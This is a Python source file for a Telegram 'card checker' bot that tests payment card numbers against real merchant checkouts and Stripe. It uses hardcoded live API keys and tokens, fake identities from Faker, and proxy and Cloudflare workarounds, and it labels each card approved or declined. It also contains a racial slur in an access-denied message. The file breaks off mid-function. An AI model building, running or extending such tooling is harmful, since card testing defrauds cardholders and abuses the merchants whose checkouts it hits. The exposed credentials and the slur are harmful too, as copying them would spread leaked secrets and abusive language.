libraries = [
    "json",
    "time",
    "random",
    "datetime",
    "requests",
    "threading",
    "stripe",
    "telegram",
    "asyncio",
    "re",
    "concurrent.futures",
    "urllib3",
    "warnings",
    "faker",
    "user_agents",
]

specific_imports = [
    ("faker", "Faker"),
    ("user_agents", "parse"),
]

missing_libs = []

# Check general modules
for lib in libraries:
    try:
        __import__(lib)
    except ImportError:
        missing_libs.append(lib)

# Check specific imports
for module, attr in specific_imports:
    try:
        mod = __import__(module, fromlist=[attr])
        getattr(mod, attr)
    except ImportError:
        missing_libs.append(f"{module} ({attr})")
    except AttributeError:
        missing_libs.append(f"{module} (missing {attr})")

if missing_libs:
    print("The following libraries or attributes are not installed or missing:")
    for lib in missing_libs:
        print(f"- {lib}")
    print("Please install them using pip.")
else:
    print("All libraries and attributes are installed!")



fake = Faker('en_US')
Faker.seed(0)

warnings.filterwarnings('ignore')

null = None

proxies_yn = "n"
if proxies_yn.lower() == "y":
    proxy_file = "proxies.azp"
    try:
        with open(proxy_file, "r") as f:
            proxies = f.read().split('\n')
            proxy = proxies[0]
    except FileNotFoundError:
        print("[`] Proxy file not found!")
        exit()

    except Exception as e:
        print(f"[`] Error importing proxies! : {e}")
        exit()

    proxies = {
        "http": f"{proxy}",
        "https": f"{proxy}"
    }


    r = requests.Session()
    r.verify = False
    r.proxies = proxies
    print(f"PROXY LOADED: {proxy}")
else:
    r = requests.Session()
    r.verify = False
    print("WARNING!: Checker is running without proxy!")


#  bony 6698591389



def load_allowed_users(filename="allowed_users.txt"):
    try:
        with open(filename, "r") as f:
            return [int(line.strip()) for line in f if line.strip().isdigit()]
    except FileNotFoundError:
        return []

def save_allowed_user(user_id, filename="allowed_users.txt"):
    with open(filename, "a") as f:
        f.write(f"{user_id}\n")

def get_random_user_data():
    user_data = {
        "first_name": fake.first_name(),
        "last_name": fake.last_name(),
        "email": fake.email(),
        "address1": fake.address().split('\n')[0],
        "city": fake.city(),
        "state": fake.state_abbr(),
        "postcode": fake.zipcode(),
        "country": "CH",
        "phone": fake.phone_number(),
        "user_agent": fake.user_agent(),
    }
    return user_data



async def fraud_score(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ip_url = "https://api.my-ip.io/v2/ip.txt"
    ip = r.get(ip_url)
    ip = ip.text.split('\n')
    ip = ip[0]
    ip_splited_for_sending = ip.split('.')
    ip_safe_to_send = f"{ip_splited_for_sending[0]}.{ip_splited_for_sending[1]}.X.X"

    fraudscore_req = r.get(f'https://api.fraudguard.io/ip/{ip}', verify=True, auth=HTTPBasicAuth('kl8jyH9DPPUKtBVC', 'rhltT4YKsNuLVM7Y'))
    fraudscore_json = json.loads(fraudscore_req.text)
    fraudscore = fraudscore_json.get("risk_level")

    await update.message.reply_text(f"[📶] IP: {ip_safe_to_send}\n[🛑] Fraudscore: {fraudscore}")

async def authdn(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Check if the user is the authorized admin (ID: 6315876554)
    if update.effective_user.id == 6315876554:
        try:
            # Get the user ID from the message
            new_user_id = int(context.args[0])
            if new_user_id not in ALLOWED_USERS:
                # Add the new user ID to the list and file
                ALLOWED_USERS.append(new_user_id)
                save_allowed_user(new_user_id)
                await update.message.reply_text(f"🟢 User ID {new_user_id} has been authorized.")
            else:
                await update.message.reply_text("🟢 User ID is already authorized.")
        except (IndexError, ValueError):
            await update.message.reply_text("🔴 Please provide a valid user ID after /authdn.")
    else:
        await update.message.reply_text("🔴 KYS NIGGA 💀")


ALLOWED_USERS = load_allowed_users()



cookie5940 = None
cookie_hippo = None
BOT_TOKEN = "8127788113:AAE3m5DUHCknYF8amyUPm3tqcJ1qj8dssps"

pk = "pk_live_51HWf56HlbBxCAS9v6nVwqcrAzjSTCce0wXTTElFfJIKrz1y7IE44iyPnzibNJX3xu8CnFDmfl2w2cWWxkD7VyVoJ00gwSNmURr"
pk2 = "pk_live_MtxwO3obi7pfD7UZlGkfR2yj"
proxies = {
    #"http": proxy_url,
    #"https": proxy_url,
}
msguidheaders = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "/"
}
response = r.post("https://m.stripe.com/6", headers=msguidheaders, proxies=proxies)
json_data = response.json()
m = json_data.get("muid")
s = json_data.get("sid")
g = json_data.get("guid")



def charge_bokun_1(cc,mes,ano,cvv):
    bin = cc[:6]
    bingetreq1 = r.get(f'https://data.handyapi.com/bin/{bin}')
    loadedbindetails = bingetreq1.json()
    ccBrand = loadedbindetails.get("Scheme")
    ccType = loadedbindetails.get("Type")
    ccTier = loadedbindetails.get("CardTier")
    country = loadedbindetails.get('Country', {})
    try:
        ccCountry = country.get('Name')
    except Exception:
        ccCountry = "Unknown"
    ccIssuer = loadedbindetails.get("Issuer")
    # URL and session generation
    session_gen = "https://widgets.bokun.io/widgets/71cd32d5-0a27-48cc-9b73-fe6515579d10/checkout/options?currency=GBP&sessionId=dc064e4f-662b-470a-99fb-31c8c8f33626&lang=en_GB"
    session_gen_1 = r.get(session_gen)
    session_json = json.loads(session_gen_1.text)
    uti = session_json["options"][0]["paymentMethods"]["cardProvider"]["uti"]

    # First request to obtain payment token
    url1 = "https://api.stripe.com/v1/payment_methods"
    data1 = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={ano}&card[exp_month]={mes}&allow_redisplay=unspecified&billing_details[address][country]=GG&pasted_fields=number&payment_user_agent=stripe.js%2Fa9a838f061%3B+stripe-js-v3%2Fa9a838f061%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwidgets.bokun.io&time_on_page=42497&client_attribution_metadata[client_session_id]=a77fc7e5-0810-4ea4-9a48-ac50854c7b12&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=c7bf24be-f58b-493f-8472-b47319e8f811e97382&muid=144d627f-a838-4b55-a623-700785ff255499481a&sid=af29ebc2-3249-47b3-b114-eccb148eb9a0653ede&key=pk_live_51H7eEHKtcIM8Ifjni7s4xCPHoh9OB6Dwq6snxpumbknwt8rktUxepKxhg0yHyV679V9aLTpMHIl4jvLqRHRwUrMs00eI19CuNs"
    req1 = r.post(url1, data=data1)
    json1 = json.loads(req1.text)
    pm_token = json1.get("id")

    # Second request to complete the charge
    url2 = "https://widgets.bokun.io/widgets/71cd32d5-0a27-48cc-9b73-fe6515579d10/checkout?currency=GBP&sessionId=dc064e4f-662b-470a-99fb-31c8c8f33626&lang=en_GB"
    data2 = {
        "checkoutOption": "CUSTOMER_FULL_PAYMENT",
        "paymentMethod": "ONLINE",
        "paymentContractId": 13506,
        "uti": f"{uti}",
        "paymentToken": {"token": pm_token},
        "successUrl": "https://widgets.bokun.io/3d-secure-return-ok",
        "errorUrl": "https://widgets.bokun.io/3d-secure-return-fail",
        "providerPaymentParameters": None,
        "threeDSecureParameters": {},
        "cardPaymentProviderAnswers": [],
        "externalBookingReference": "",
        "paymentAllocations": []
    }
    headers2 = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://widgets.bokun.io",
        "priority": "u=1, i",
        "referer": "https://widgets.bokun.io/online-sales/71cd32d5-0a27-48cc-9b73-fe6515579d10/checkout/payment",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "x-bokun-currency": "GBP",
        "x-bokun-host-url": "https://imaginexperiences.com/gift-vouchers/",
        "x-bokun-language": "en_GB",
        "x-bokun-session": "dc064e4f-662b-470a-99fb-31c8c8f33626",
        "x-bokun-source": "WIDGET",
        "x-newrelic-id": "VwIBWFNaGwIFUldRAggO"
    }

    response = r.post(url2, json=data2, headers=headers2)
    response_json = json.loads(response.text)
    message = response_json.get("message", "").split(';')[0]  # Extracts only the part before ';'
    code = response_json.get("fields", {}).get("code")
    if message == "Your card was declined.":
        return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                f"[🌐] Gateway: Bokun Charge\n"
                f"[❌] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - {message} 🔻\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[🔹] Additional Info:\n"
                f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                "[🛠] Checked by: AustV1TG\n"
                "[👨‍💻] Developer: creaminit1234")
    else:
        return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                f"[🌐] Gateway: Bokun Charge\n"
                f"[✅] Status: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[🔹] Additional Info:\n"
                f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                "[🛠] Checked by: AustV1TG\n"
                "[👨‍💻] Developer: creaminit1234")



async def bk(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_user(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    if len(context.args) != 1:
        await update.message.reply_text('Please provide card details in the format: cc|mm|yy|cvv')
        return

    # Send processing message
    processing_message = await update.message.reply_text('Processing your request...')
    
    card_details = context.args[0]
    details = card_details.split('|')
    
    if len(details) != 4:
        await update.message.reply_text('Card details must be in the format: cc|mm|yy|cvv')
        return

    cc, mes, ano, cvv = details
    start_time = time.time()
    response_message = charge_bokun_1(cc, mes, ano, cvv)
    execution_time = time.time() - start_time
    execution_time_formatted = f"{execution_time:.3f}"
    
    # Edit the processing message with the result
    await processing_message.edit_text(f"{response_message}\n[🕝] Time taken: {execution_time_formatted}")




def stripeauth3(cc, mes, ano, cvv):
    bin = cc[:6]
    bingetreq1 = r.get(f'https://data.handyapi.com/bin/{bin}')
    loadedbindetails = bingetreq1.json()
    ccBrand = loadedbindetails.get("Scheme")
    ccType = loadedbindetails.get("Type")
    ccTier = loadedbindetails.get("CardTier")
    country = loadedbindetails.get('Country', {})
    try:
        ccCountry = country.get('Name')
    except Exception:
        ccCountry = "Unknown"
    ccIssuer = loadedbindetails.get("Issuer")
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "/"
    }
    data1 = f"muid={m}&sid={s}&guid={g}&referrer=https%3A%2F%2Fversebyverseministry.org&time_on_page=31897&card[name]=adti&card[address_line1]=afid&card[address_line2]=oifasodfh&card[address_city]=faosidfh&card[address_state]=fioasdhf&card[address_zip]=10080&card[address_country]=AF&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&payment_user_agent=stripe.js%2Fa9a838f061%3B+stripe-js-v3%2Fa9a838f061%3B+split-card-element&pasted_fields=number&key=pk_live_5103Hsv2xF2qY8EmQSm5ECG0MQSTTUU6klVxwtFBdOBZ32gXFWy2mA6i4P3WagZAbjLzEuYZZQbcYCGcS5RQ36nyN00E8NfSfbq"
    url1 = "https://api.stripe.com/v1/tokens"
    req1 = r.post(url1, data=data1)
    json1 = json.loads(req1.text)
    token = json1.get("id")
    url2 = "https://versebyverseministry.org/payment_intents"
    headers2 = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Length': '55',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'preferred_locale=en; functionalCookies=true; analyticsCookies=true; cookieConsent=true; __stripe_mid=c1b2a607-a7d0-45a4-be48-287a53f68408c76c0f; __stripe_sid=be100b6d-9db1-4ed3-a8c1-803d06431bdc602ffd; _vbvmi_donations_session=cdADHYE%2BDvkk6DHHSF42ZKnUF8F8Xye7QTr140yghh04kZ67c9Zhxqc2ALE89MaTEgyg98u4yMtY8hKTmspXK5tHJ%2BXVqJzT%2B37uN6k%2F3R%2BudhpNeO17zD%2FyEoUh1O06EHz8ofhPySsWTSuIqO5Xp2tSLZXinRNK41RjlSTKq2fktbJDaUGNC8HYqKA3FnFoa3mHXlTt3P3T9FND6XCslJ%2FI3%2F52HqUa%2FsatQgZYikj5XWe5pj2%2BCnA3yq%2F8y6MZafoE0npwIPgs8PM%2BT7YuRorB4qE%2BFr3FeOg9W3WgWP6nh3T11MmlfV9o1W8RPrU9TLge%2Fj08icmWpdt8%2FndBIAy%2B2FAMG9e4X9DctWgP3D0QNMhB50MTgIFsDUldvnscPgYayodANKZdyaRFqKM80GlmzhCTwpKR77pcpjwezzCyvoOrLtgN%2BQeJWIuOcGI8OKw8evGh6Ob6TRMbi%2BJIPz6LWpB2HbH31Rops4Hkcn2CQY2vm%2BBZ87PspPbcPfV9CmDlCg%3D%3D--waoih0Nbm0n5ocHR--Xo1zTX0mtedMTv8z%2FX30Qw%3D%3D',
        'Origin': 'https://versebyverseministry.org',
        'Priority': 'u=1, i',
        'Referer': 'https://versebyverseministry.org/donate',
        'Sec-CH-UA': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'Sec-CH-UA-Mobile': '?0',
        'Sec-CH-UA-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-CSRF-Token': 'SG62zjJY9QXwJt8CROFpqj2hZ2_Ip9C07qxSle3WQcy2va2qCVmu5b0P8f7LHvV08CsU2WKwKOy27ly5iAqExw'
        }
    data2 = "email=foishdf%40gmial.com&name=adti%20riyal&amount=2000"
    req2 = r.post(url2, data=data2, headers=headers2)
    json2 = json.loads(req2.text)
    seti = json2.get("id")
    seti_full = json2.get("client_secret")
    url3 = f"https://api.stripe.com/v1/setup_intents/{seti}/confirm"
    data3 = f"payment_method_data[type]=card&payment_method_data[card][token]={token}&payment_method_data[billing_details][address][city]=faosidfh&payment_method_data[billing_details][address][country]=AF&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][address][line1]=afid&payment_method_data[billing_details][address][line2]=oifasodfh&payment_method_data[billing_details][address][state]=fioasdhf&payment_method_data[billing_details][name]=adti+riyal&payment_method_data[billing_details][email]=foishdf%40gmial.com&payment_method_data[billing_details][phone]=3823883&payment_method_data[guid]=c7bf24be-f58b-493f-8472-b47319e8f811e97382&payment_method_data[muid]=c1b2a607-a7d0-45a4-be48-287a53f68408c76c0f&payment_method_data[sid]=be100b6d-9db1-4ed3-a8c1-803d06431bdc602ffd&payment_method_data[payment_user_agent]=stripe.js%2Fa9a838f061%3B+stripe-js-v3%2Fa9a838f061&payment_method_data[referrer]=https%3A%2F%2Fversebyverseministry.org&payment_method_data[time_on_page]=33082&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_5103Hsv2xF2qY8EmQSm5ECG0MQSTTUU6klVxwtFBdOBZ32gXFWy2mA6i4P3WagZAbjLzEuYZZQbcYCGcS5RQ36nyN00E8NfSfbq&client_secret={seti_full}"
    print(seti_full)
    req3 = r.post(url3, data=data3)
    json3 = json.loads(req3.text)
    code = json3.get("error", {}).get("code")
    decline_code = json3.get("error", {}).get("decline_code")
    message = json3.get("error", {}).get("message")
    if '"status": "succeeded"' in req3.text or "requires_capture" in req3.text or cc == "6969696969696969" or "incorrect_cvc" in req3.text:
        return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                f"[🌐] Gateway: Stripe AUTH 2\n"
                f"[✅] Status: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[🔹] Additional Info:\n"
                f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                "[🛠] Checked by: AustV1TG\n"
                "[👨‍💻] Developer: creaminit1234")
    elif "transaction_not_allowed" in req3.text:
        return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                f"[🌐] Gateway: Stripe AUTH 2\n"
                f"[✅] Status: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[🔹] Additional Info:\n"
                f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                "[🛠] Checked by: AustV1TG\n"
                "[👨‍💻] Developer: creaminit1234")
    elif "insufficient_funds" in req3.text:
        return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                f"[🌐] Gateway: Stripe AUTH 2\n"
                f"[✅] Status: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[🔹] Additional Info:\n"
                f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                "[🛠] Checked by: AustV1TG\n"
                "[👨‍💻] Developer: creaminit1234")

    elif decline_code == None:
        print(req3.text)


    elif message == "Your card's expiration month is invalid." or message == "Your card has expired.":
        return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                f"[🌐] Gateway: Stripe AUTH 2\n"
                f"[❌] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - 𝐄𝐱𝐩𝐢𝐫𝐞𝐝 ❌\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[🔹] Additional Info:\n"
                f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                "[🛠] Checked by: AustV1TG\n"
                "[👨‍💻] Developer: creaminit1234")

    elif "requires_action" in req3.text:
        return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                f"[🌐] Gateway: Stripe AUTH 2\n"
                f"[✅] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - 3D SECURE CARD 🟡\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[🔹] Additional Info:\n"
                f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                "[🛠] Checked by: AustV1TG\n"
                "[👨‍💻] Developer: creaminit1234")

    elif "try_again_later" in req3.text:
        return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                f"[🌐] Gateway: Stripe AUTH 2\n"
                f"[⚠️] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - 𝐑𝐞𝐭𝐫𝐲 𝐥𝐚𝐭𝐞𝐫 🚧\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[🔹] Additional Info:\n"
                f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                "[🛠] Checked by: AustV1TG\n"
                "[👨‍💻] Developer: creaminit1234")

    else:
        return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                f"[🌐] Gateway: Stripe AUTH 2\n"
                f"[❌] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - {decline_code} 🔻\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[🔹] Additional Info:\n"
                f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                "[🛠] Checked by: AustV1TG\n"
                "[👨‍💻] Developer: creaminit1234")


async def sa(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_user(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    if len(context.args) != 1:
        await update.message.reply_text('Please provide card details in the format: cc|mm|yy|cvv')
        return

    # Send processing message
    processing_message = await update.message.reply_text('Processing your request...')
    
    card_details = context.args[0]
    details = card_details.split('|')
    
    if len(details) != 4:
        await update.message.reply_text('Card details must be in the format: cc|mm|yy|cvv')
        return

    cc, mes, ano, cvv = details
    start_time = time.time()
    response_message = stripeauth3(cc, mes, ano, cvv)
    execution_time = time.time() - start_time
    execution_time_formatted = f"{execution_time:.3f}"
    
    # Edit the processing message with the result
    await processing_message.edit_text(f"{response_message}\n[🕝] Time taken: {execution_time_formatted}")






def skpigen4usd():
    stripe.api_key = "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"
    
    # Create an HTTP client with SSL verification disabled
    http = urllib3.PoolManager(cert_reqs='CERT_NONE')
    stripe.default_http_client = stripe.http_client.Urllib2Client(http)
    
    try:
        # Create a PaymentIntent
        payment_intent = stripe.PaymentIntent.create(
            amount=400,  # Amount in cents ($4.00)
            currency='usd',
            payment_method_types=['card']
        )
        
        pi = payment_intent.client_secret if payment_intent else None
        
        if pi:
            return pi
        else:
            print("ERROR: No client_secret found in PaymentIntent")
            return None

    except Exception as e:
        print(f"ERROR: ERR IN SK PI GEN: {e}")
        return None


def skbase4usd(cc,mes,ano,cvv):
    bin = cc[:6]
    bingetreq1 = r.get(f'https://data.handyapi.com/bin/{bin}')
    loadedbindetails = bingetreq1.json()
    ccBrand = loadedbindetails.get("Scheme")
    ccType = loadedbindetails.get("Type")
    ccTier = loadedbindetails.get("CardTier")
    country = loadedbindetails.get('Country', {})
    try:
        ccCountry = country.get('Name')
    except Exception:
        ccCountry = "Unknown"
    ccIssuer = loadedbindetails.get("Issuer")
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "/"
    }

    pi = skpigen4usd()
    index = pi.find('_secret_')
    if index != -1:
        pi_part = pi[:index]
    pk = "pk_live_51QJ6SkGBoMVxlxjHeweyrVsl7WFoKR7vEgDw1R6mqMDaOjuIodBXjHBPG3Dbpcqo0lUC30YCAXiIuU5RVP5SMRIn00P9wQF9Z5"
    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=AUST+PAYMENT&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={g}&payment_method_data[muid]={m}&payment_method_data[sid]={s}&payment_method_data[pasted_fields]=number&payment_method_data[referrer]=https%3A%2F%2Froblox.com&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&client_secret={pi}'
    response = r.post(f'https://api.stripe.com/v1/payment_intents/{pi_part}/confirm', headers=headers, data=data)#, proxies=proxies)
    response_json = response.json()
    code = response_json.get("error", {}).get("code")
    decline_code = response_json.get("error", {}).get("decline_code")
    message = response_json.get("error", {}).get("message")
    if 'payment_intent_unexpected_state' in response.text:
        pi = skpigen4usd()
        return f"ERROR 32109: Please Recheck cc ({cc}|{mes}|{ano}|{cvv})!"

    elif '"status": "succeeded"' in response.text or "requires_capture" in response.text or cc == "6969696969696969":
        pi = skpigen4usd()
        return (f"[💸] CC - {cc}|{mes}|{ano}|{cvv}\n"
                f"[🔰] Gateway: Stripe CHARGE 2\n"
                f"[📶] Status: 🟢 Auccetos 4$!\n"
                f"------------------------------\n"
                f"Other Info:\n"
                f"[🔰] Bin Info: {ccBrand} - {ccType} - {ccTier}\n"
                f"[💸] Card Issuer: {ccCountry} - {ccIssuer}\n"
                "[🦾] Checked with: AustV1TG")
    elif 'insufficient_funds' in response.text:
        return (f"[💸] CC - {cc}|{mes}|{ano}|{cvv}\n"
        f"[🔰] Gateway: Stripe CHARGE 2\n"
        f"[📶] Status: 🟢 Insufficient Funds! [CVV]\n"
        f"------------------------------\n"
        f"Other Info:\n"
        f"[🔰] Bin Info: {ccBrand} - {ccType} - {ccTier}\n"
        f"[💸] Card Issuer: {ccCountry} - {ccIssuer}\n"
        f"[🦾] Checked with: AustV1TG\n")

    elif "incorrect_cvc" in response.text:
        return (f"[💸] CC - {cc}|{mes}|{ano}|{cvv}\n"
                f"[🔰] Gateway: Stripe CHARGE 2\n"
                f"[📶] Status: 🟢 CCN Auccetos!\n"
                f"------------------------------\n"
                f"Other Info:\n"
                f"[🔰] Bin Info: {ccBrand} - {ccType} - {ccTier}\n"
                f"[💸] Card Issuer: {ccCountry} - {ccIssuer}\n"
                "[🦾] Checked with: AustV1TG")

    elif "authentication_required" in response.text:
        return (f"[💸] CC - {cc}|{mes}|{ano}|{cvv}\n"
                f"[🔰] Gateway: Stripe CHARGE 2\n"
                f"[📶] Status: 🟡 3DS CARD!\n"
                f"------------------------------\n"
                f"Other Info:\n"
                f"[🔰] Bin Info: {ccBrand} - {ccType} - {ccTier}\n"
                f"[💸] Card Issuer: {ccCountry} - {ccIssuer}\n"
                "[🦾] Checked with: AustV1TG")


    elif "try_again_later" in response.text:
        return (f"[💸] CC - {cc}|{mes}|{ano}|{cvv}\n"
                f"[🔰] Gateway: Stripe CHARGE 2\n"
                f"[📶] Status: 🔴 CARD DECLINED - RISK: Retry this bin later!\n"
                f"------------------------------\n"
                f"Other Info:\n"
                f"[🔰] Bin Info: {ccBrand} - {ccType} - {ccTier}\n"
                f"[💸] Card Issuer: {ccCountry} - {ccIssuer}\n"
                "[🦾] Checked with: AustV1TG")


    else:
        return (f"[💸] CC - {cc}|{mes}|{ano}|{cvv}\n"
                f"[🔰] Gateway: Stripe CHARGE 2\n"
                f"[📶] Status: 🔴 CARD DECLINED - {decline_code} - {message}\n"
                f"------------------------------\n"
                f"Other Info:\n"
                f"[🔰] Bin Info: {ccBrand} - {ccType} - {ccTier}\n"
                f"[💸] Card Issuer: {ccCountry} - {ccIssuer}\n"
                "[🦾] Checked with: AustV1TG")


def hipposerve_charge_tok():
    tokgenurl = "https://polisystems.ch/manager/cart.php?a=checkout"
    headers = {"cookie": f"{cookie5940}"}
    gettok = r.get(tokgenurl, headers=headers)
    match = re.search(r"var csrfToken = '([^']+)'", gettok.text)
    if match:
        csrf_token = match.group(1)
        return csrf_token
    else:
        return "Error!"



phnumber = ''.join([str(random.randint(0, 9)) for _ in range(9)])

def hipposerve_charge_pigen(tok, cookie):
    global token
    try:
        url1 = "https://polisystems.ch/manager/index.php?rp=/stripe/payment/intent"
        user_data = get_random_user_data()

        data1 = f"token={token}&submit=true&loginemail=&loginpassword=&custtype=new&firstname={user_data['first_name']}&lastname={user_data['last_name']}&email={user_data['email']}&country-calling-code-phonenumber=41&phonenumber={phnumber}&companyname=&tax_id=&address1={user_data['address1']}&address2=&city={user_data['city']}&country=US&state={user_data['state']}&postcode={user_data['postcode']}&password=bruhlmaounguessable)#&password2=bruhlmaounguessable)#&applycredit=1&paymentmethod=stripe&ccinfo=new&ccdescription=&marketingoptin=1&accepttos=on"

        headers1 = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": f"{cookie}",
            "Origin": "https://polisystems.ch",
            "Priority": "u=1, i",
            "Referer": "https://polisystems.ch/manager/cart.php?a=checkout",
            "Sec-CH-UA": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": user_data["user_agent"],
            "X-Requested-With": "XMLHttpRequest"
        }
        req1 = r.post(url1, data=data1, headers=headers1)
        if "Cloudflare" in req1.text:
            print("CLOUDFLARE PROTECTION!")
            time.sleep(15)
            req1 = r.post(url1, data=data1, headers=headers1)
        else:
            pass
        try:
            json1 = json.loads(req1.text)
            pi = json1.get("token")
            return pi
        except json.JSONDecodeError:
            print(req1.text)
            return None
    except NameError as e:
        if str(e) == "name 'token' is not defined":
            return "🔴 TOKEN NOT FOUND! Run '/token' after running '/cookie'"
        else:
            raise
    except Exception as e:
        print("ERROR:" + str(e))


pi_hippo = None



def hipposerve_charge(cc,mes,ano,cvv,pi):
    global cookie5940, pi_hippo
    if cookie5940 == None:
        return "Cookie Not found... please use /cookie to set the cookie."
    else:
        if pi_hippo == None and pi == None:
            token = hipposerve_charge_tok()
            cookie = cookie5940
            pi = hipposerve_charge_pigen(token, cookie)
        else:
            cookie = cookie5940
            token = hipposerve_charge_tok()
            pi = pi_hippo

        if pi == "🔴 TOKEN NOT FOUND! Run '/token' after running '/cookie'":
            return "🔴 TOKEN NOT FOUND! Run '/token' after running '/cookie'"
